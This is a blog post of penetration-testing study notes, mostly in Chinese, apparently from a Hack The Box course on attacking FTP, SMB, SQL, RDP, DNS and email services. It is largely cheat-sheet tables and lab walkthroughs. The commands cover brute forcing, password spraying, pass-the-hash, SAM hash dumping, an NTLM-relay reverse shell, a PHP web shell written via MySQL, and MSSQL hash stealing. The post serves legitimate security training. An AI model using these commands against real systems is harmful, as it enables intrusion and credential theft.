<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>attacking SERVICES</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="Attacking FTPBrute Forcing Medusa
使用Medusa，我们可以使用选项-u指定要针对的单个用户，也可以使用选项-u提供一个包含用户名列表的文件。选项-P用于包含密码列表的文件。我们可以使用选项-M和目标协议（FTP），并使用选项-h作为目标主机名或IP地址。


Tanin@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 

备忘录攻击 FTP


命令
描述



ftp 192.168.2.142
使用客户端连接到 FTP 服务器。ftp


nc -v 192.168.2.142 21
使用 连接到 FTP 服务器。netcat


hydra -.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">attacking SERVICES</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-FTP"><span class="toc-text">Attacking FTP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Brute-Forcing"><span class="toc-text">Brute Forcing</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-text">备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-FTP"><span class="toc-text">攻击 FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%B8%AD%E5%B0%8F%E4%BC%81%E4%B8%9A"><span class="toc-text">攻击中小企业</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-SQL-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">攻击 SQL 数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-RDP"><span class="toc-text">攻击 RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-text">攻击域名解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="toc-text">攻击电子邮件服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-FTP-1"><span class="toc-text">Attacking FTP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Brute-Forcing-1"><span class="toc-text">Brute Forcing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-Bounce-Attack"><span class="toc-text">FTP Bounce Attack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#practice"><span class="toc-text">practice</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-SMB"><span class="toc-text">Attacking SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Anonymous-Authentication"><span class="toc-text">Anonymous Authentication</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Share"><span class="toc-text">File Share</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Remote-Procedure-Call-RPC"><span class="toc-text">Remote Procedure Call (RPC)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Remote-Code-Execution-RCE"><span class="toc-text">Remote Code Execution (RCE)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Impacket-PsExec"><span class="toc-text">Impacket PsExec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CrackMapExec"><span class="toc-text">CrackMapExec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumerating-Logged-on-Users"><span class="toc-text">Enumerating Logged-on Users</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Extract-Hashes-from-SAM-Database"><span class="toc-text">Extract Hashes from SAM Database</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pass-the-Hash-PtH"><span class="toc-text">Pass-the-Hash (PtH)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Forced-Authentication-Attacks"><span class="toc-text">Forced Authentication Attacks</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#practice-1"><span class="toc-text">practice</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-SQL-Databases"><span class="toc-text">Attacking SQL Databases</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-Connecting-to-the-SQL-Server"><span class="toc-text">MySQL - Connecting to the SQL Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sqlcmd-Connecting-to-the-SQL-Server"><span class="toc-text">Sqlcmd - Connecting to the SQL Server</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Execute-Commands"><span class="toc-text">Execute Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Local-Files"><span class="toc-text">Write Local Files</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-Read-Local-Files-in-MySQL"><span class="toc-text">MySQL - Read Local Files in MySQL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capture-MSSQL-Service-Hash"><span class="toc-text">Capture MSSQL Service Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XP-DIRTREE-Hash-Stealing"><span class="toc-text">XP_DIRTREE Hash Stealing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XP-SUBDIRS-Hash-Stealing"><span class="toc-text">XP_SUBDIRS Hash Stealing</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#practice-2"><span class="toc-text">practice</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-DNS"><span class="toc-text">Attacking DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Takeovers-amp-Subdomain-Enumeration"><span class="toc-text">Domain Takeovers &amp; Subdomain Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Local-DNS-Cache-Poisoning"><span class="toc-text">Local DNS Cache Poisoning</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#practice-3"><span class="toc-text">practice</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-Email-Services"><span class="toc-text">Attacking Email Services</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-1"><span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Host-MX-Records"><span class="toc-text">Host - MX Records</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DIG-MX-Records"><span class="toc-text">DIG - MX Records</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DIG-A-Record-for-MX"><span class="toc-text">DIG - A Record for MX</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misconfigurations"><span class="toc-text">Misconfigurations</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Authentication"><span class="toc-text">Authentication</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VRFY-Command"><span class="toc-text">VRFY Command</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXPN-Command"><span class="toc-text">EXPN Command</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCPT-TO-Command"><span class="toc-text">RCPT TO Command</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cloud-Enumeration"><span class="toc-text">Cloud Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#O365-Spray"><span class="toc-text">O365 Spray</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Attacks"><span class="toc-text">Password Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#O365-Spray-Password-Spraying"><span class="toc-text">O365 Spray - Password Spraying</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Protocol-Specifics-Attacks"><span class="toc-text">Protocol Specifics Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Open-Relay"><span class="toc-text">Open Relay</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#practice-4"><span class="toc-text">practice</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/base"><i class="tag post-item-tag">base</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">attacking SERVICES</h1><time class="has-text-grey" datetime="2023-08-10T01:57:02.000Z">2023-08-10</time><article class="mt-2 post-content"><h1 id="Attacking-FTP"><a href="#Attacking-FTP" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing"><a href="#Brute-Forcing" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><p> <a target="_blank" rel="noopener" href="https://github.com/jmk-foofus/medusa">Medusa</a></p>
<p>使用Medusa，我们可以使用选项-u指定要针对的单个用户，也可以使用选项-u提供一个包含用户名列表的文件。选项-P用于包含密码列表的文件。我们可以使用选项-M和目标协议（FTP），并使用选项-h作为目标主机名或IP地址。</p>
<span id="more"></span>

<pre><code class="shell-session">Tanin@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
</code></pre>
<h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="攻击-FTP"><a href="#攻击-FTP" class="headerlink" title="攻击 FTP"></a>攻击 FTP</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ftp 192.168.2.142</code></td>
<td>使用客户端连接到 FTP 服务器。<code>ftp</code></td>
</tr>
<tr>
<td><code>nc -v 192.168.2.142 21</code></td>
<td>使用 连接到 FTP 服务器。<code>netcat</code></td>
</tr>
<tr>
<td><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td>
<td>暴力破解 FTP 服务。</td>
</tr>
</tbody></table>
<hr>
<h2 id="攻击中小企业"><a href="#攻击中小企业" class="headerlink" title="攻击中小企业"></a>攻击中小企业</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>smbclient -N -L //10.129.14.128</code></td>
<td>针对 SMB 服务的空会话测试。</td>
</tr>
<tr>
<td><code>smbmap -H 10.129.14.128</code></td>
<td>使用 进行网络共享枚举。<code>smbmap</code></td>
</tr>
<tr>
<td><code>smbmap -H 10.129.14.128 -r notes</code></td>
<td>使用 .<code>smbmap</code></td>
</tr>
<tr>
<td><code>smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;</code></td>
<td>从共享文件夹下载特定文件。</td>
</tr>
<tr>
<td><code>smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;</code></td>
<td>将特定文件上传到共享文件夹。</td>
</tr>
<tr>
<td><code>rpcclient -U&#39;%&#39; 10.10.110.17</code></td>
<td>空会话与 .<code>rpcclient</code></td>
</tr>
<tr>
<td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td>
<td>使用 自动枚举 SMB 服务。<code>enum4linux-ng</code></td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39;</code></td>
<td>针对列表中的不同用户喷洒密码。</td>
</tr>
<tr>
<td><code>impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></td>
<td>使用 连接到 SMB 服务。<code>impacket-psexec</code></td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec</code></td>
<td>使用 对 SMB 服务执行命令。<code>crackmapexec</code></td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></td>
<td>枚举登录用户。</td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></td>
<td>从 SAM 数据库中提取哈希。</td>
</tr>
<tr>
<td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td>
<td>使用哈希传递技术在目标主机上进行身份验证。</td>
</tr>
<tr>
<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td>
<td>使用 转储 SAM 数据库。<code>impacket-ntlmrelayx</code></td>
</tr>
<tr>
<td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e &lt;base64 reverse shell&gt;</code></td>
<td>使用 执行基于 PowerShell 的反向外壳。<code>impacket-ntlmrelayx</code></td>
</tr>
</tbody></table>
<hr>
<h2 id="攻击-SQL-数据库"><a href="#攻击-SQL-数据库" class="headerlink" title="攻击 SQL 数据库"></a>攻击 SQL 数据库</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td>
<td>连接到 MySQL 服务器。</td>
</tr>
<tr>
<td><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></td>
<td>连接到 MSSQL 服务器。</td>
</tr>
<tr>
<td><code>sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -h</code></td>
<td>从 Linux 连接到 MSSQL 服务器。</td>
</tr>
<tr>
<td><code>sqsh -S 10.129.203.7 -U .\\julio -P &#39;MyPassword!&#39; -h</code></td>
<td>从 Linux 连接到 MSSQL 服务器，而 MSSQL 服务器使用 Windows 身份验证机制。</td>
</tr>
<tr>
<td><code>mysql&gt; SHOW DATABASES;</code></td>
<td>显示 MySQL 中的所有可用数据库。</td>
</tr>
<tr>
<td><code>mysql&gt; USE htbusers;</code></td>
<td>在 MySQL 中选择一个特定的数据库。</td>
</tr>
<tr>
<td><code>mysql&gt; SHOW TABLES;</code></td>
<td>在 MySQL 中显示所选数据库中的所有可用表。</td>
</tr>
<tr>
<td><code>mysql&gt; SELECT * FROM users;</code></td>
<td>从MySQL中的“用户”表中选择所有可用条目。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT name FROM master.dbo.sysdatabases</code></td>
<td>显示 MSSQL 中的所有可用数据库。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; USE htbusers</code></td>
<td>在 MSSQL 中选择特定的数据库。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td>
<td>在 MSSQL 中显示所选数据库中的所有可用表。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT * FROM users</code></td>
<td>从 MSSQL 中的“用户”表中选择所有可用条目。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXECUTE sp_configure &#39;show advanced options&#39;, 1</code></td>
<td>允许更改高级选项。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1</code></td>
<td>启用xp_cmdshell。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; RECONFIGURE</code></td>
<td>在每个sp_configure命令之后使用以应用更改。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; xp_cmdshell &#39;whoami&#39;</code></td>
<td>从 MSSQL 服务器执行系统命令。</td>
</tr>
<tr>
<td><code>mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;</code></td>
<td>使用 MySQL 创建一个文件。</td>
</tr>
<tr>
<td><code>mysql&gt; show variables like &quot;secure_file_priv&quot;;</code></td>
<td>检查安全文件权限是否为空，以读取系统上本地存储的文件。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents</code></td>
<td>读取 MSSQL 中的本地文件。</td>
</tr>
<tr>
<td><code>mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></td>
<td>在 MySQL 中读取本地文件。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;</code></td>
<td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_dirtree</code></td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;</code></td>
<td>使用 MSSQL 中的命令进行哈希窃取。<code>xp_subdirs</code></td>
</tr>
<tr>
<td><code>sqlcmd&gt; SELECT srvname, isremote FROM sysservers</code></td>
<td>标识 MSSQL 中的链接服务器。</td>
</tr>
<tr>
<td><code>sqlcmd&gt; EXECUTE(&#39;select @@servername, @@version, system_user, is_srvrolemember(&#39;&#39;sysadmin&#39;&#39;)&#39;) AT [10.0.0.12\SQLEXPRESS]</code></td>
<td>标识用户及其在 MSSQL 中用于远程连接的权限。</td>
</tr>
</tbody></table>
<hr>
<h2 id="攻击-RDP"><a href="#攻击-RDP" class="headerlink" title="攻击 RDP"></a>攻击 RDP</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c &#39;password123&#39;</code></td>
<td>针对 RDP 服务喷洒密码。</td>
</tr>
<tr>
<td><code>hydra -L usernames.txt -p &#39;password123&#39; 192.168.2.143 rdp</code></td>
<td>暴力破解 RDP 服务。</td>
</tr>
<tr>
<td><code>rdesktop -u admin -p password123 192.168.2.143</code></td>
<td>在 Linux 中使用连接到 RDP 服务。<code>rdesktop</code></td>
</tr>
<tr>
<td><code>tscon #&#123;TARGET_SESSION_ID&#125; /dest:#&#123;OUR_SESSION_NAME&#125;</code></td>
<td>在没有密码的情况下模拟用户。</td>
</tr>
<tr>
<td><code>net start sessionhijack</code></td>
<td>执行 RDP 会话劫持。</td>
</tr>
<tr>
<td><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td>
<td>在目标 Windows 主机上启用“受限管理模式”。</td>
</tr>
<tr>
<td><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td>
<td>使用哈希传递技术在没有密码的情况下登录目标主机。</td>
</tr>
</tbody></table>
<hr>
<h2 id="攻击域名解析"><a href="#攻击域名解析" class="headerlink" title="攻击域名解析"></a>攻击域名解析</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td>
<td>对特定名称服务器执行 AXFR 区域传输尝试。</td>
</tr>
<tr>
<td><code>subfinder -d inlanefreight.com -v</code></td>
<td>暴力破解子域。</td>
</tr>
<tr>
<td><code>host support.inlanefreight.com</code></td>
<td>指定子域的 DNS 查找。</td>
</tr>
</tbody></table>
<hr>
<h2 id="攻击电子邮件服务"><a href="#攻击电子邮件服务" class="headerlink" title="攻击电子邮件服务"></a>攻击电子邮件服务</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>host -t MX microsoft.com</code></td>
<td>指定域的邮件服务器的 DNS 查找。</td>
</tr>
<tr>
<td>&#96;dig mx inlanefreight.com</td>
<td>grep “MX”</td>
</tr>
<tr>
<td><code>host -t A mail1.inlanefreight.htb.</code></td>
<td>指定子域的 IPv4 地址的 DNS 查找。</td>
</tr>
<tr>
<td><code>telnet 10.10.110.20 25</code></td>
<td>连接到 SMTP 服务器。</td>
</tr>
<tr>
<td><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td>
<td>对指定主机使用 RCPT 命令进行 SMTP 用户枚举。</td>
</tr>
<tr>
<td><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td>
<td>验证指定域的 Office365 使用情况。</td>
</tr>
<tr>
<td><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td>
<td>枚举在指定域上使用 Office365 的现有用户。</td>
</tr>
<tr>
<td><code>python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></td>
<td>针对对指定域使用 Office365 的用户列表进行密码喷涂。</td>
</tr>
<tr>
<td><code>hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></td>
<td>暴力破解 POP3 服务。</td>
</tr>
<tr>
<td><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Notification&#39; --body &#39;Message&#39; --server 10.10.11.213</code></td>
<td>测试 SMTP 服务是否存在开放中继漏洞。</td>
</tr>
</tbody></table>
<h1 id="Attacking-FTP-1"><a href="#Attacking-FTP-1" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing-1"><a href="#Brute-Forcing-1" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><h4 id="FTP-Bounce-Attack"><a href="#FTP-Bounce-Attack" class="headerlink" title="FTP Bounce Attack"></a>FTP Bounce Attack</h4><p>FTP反弹攻击 FTP反弹攻击是一种使用FTP服务器将出站流量传递到网络上另一个设备的网络攻击。攻击者使用PORT命令诱骗FTP连接运行命令并从预期服务器以外的设备获取信息。 假设我们的目标是暴露在互联网上的FTP服务器FTP_DMZ。同一网络中的另一个设备Internal_DMZ没有暴露在互联网上。我们可以使用与FTP_DMZ服务器的连接，使用FTP Bounce攻击扫描Internal_DMZ，并获取有关服务器打开端口的信息。然后，我们可以将这些信息作为攻击基础设施的一部分。</p>
<p>Nmap-b标志可用于执行FTP反弹攻击：</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
</code></pre>
<h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote>
<p>FTP 服务在哪个端口上运行？</p>
<p>FTP 服务器可以使用什么用户名？</p>
<p>使用发现的用户名及其密码通过SSH登录并获取标志.txt文件。提交内容作为您的答案。</p>
</blockquote>
<p>先扫描主机：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111503815.png" alt="image-20230811150309711">发现都有防火墙保护，挨个端口扫描发现2121端口开了ftp服务</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111504966.png" alt="image-20230811150445925"></p>
<p>他这里允许匿名登录ftp，链接上去后发现了一个密码本和一个用户列表，用hydra或者Medusa爆破一下：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111506125.png" alt="image-20230811150617076"></p>
<p>然后ssh登录即可</p>
<h1 id="Attacking-SMB"><a href="#Attacking-SMB" class="headerlink" title="Attacking SMB"></a>Attacking SMB</h1><p>根据SMB实现和操作系统的不同，我们将使用Nmap获得不同的信息。请记住，在针对Windows操作系统时，版本信息通常不会包含在Nmap扫描结果中。相反，Nmap将尝试猜测操作系统的版本。然而，我们通常需要其他扫描来确定目标是否容易受到特定攻击。我们将在本节稍后介绍搜索已知漏洞。现在，让我们扫描端口139和445 TCP。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
</code></pre>
<p>Nmap扫描揭示了目标的基本信息： SMB版本（Samba-smbd 4.6.2） 主机名HTB 操作系统是基于SMB实现的Linux</p>
<h4 id="Anonymous-Authentication"><a href="#Anonymous-Authentication" class="headerlink" title="Anonymous Authentication"></a>Anonymous Authentication</h4><p>如果我们找到一个不需要用户名和密码或找到有效凭据的SMB服务器，我们可以获得共享、用户名、组、权限、策略、服务等的列表。大多数与SMB交互的工具都允许空会话连接，包括smbclient、smbmap、rpcclient或enum4linux。让我们探讨一下如何使用null身份验证与文件共享和RPC进行交互。</p>
<h4 id="File-Share"><a href="#File-Share" class="headerlink" title="File Share"></a>File Share</h4><p>使用smbclient，我们可以使用选项-L显示服务器的共享列表，使用选项-N，我们告诉smbclient使用null会话。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
</code></pre>
<p>Smbmap是另一个帮助我们枚举网络共享和访问相关权限的工具。smbmap的一个优点是它为每个共享文件夹提供了一个权限列表。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
</code></pre>
<p>使用带有-r或-r（递归）选项的smbmap，可以浏览目录：</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
</code></pre>
<p>从上面的例子中，权限被设置为READ和WRITE，可以用来上传和下载文件。</p>
<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
</code></pre>
<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
</code></pre>
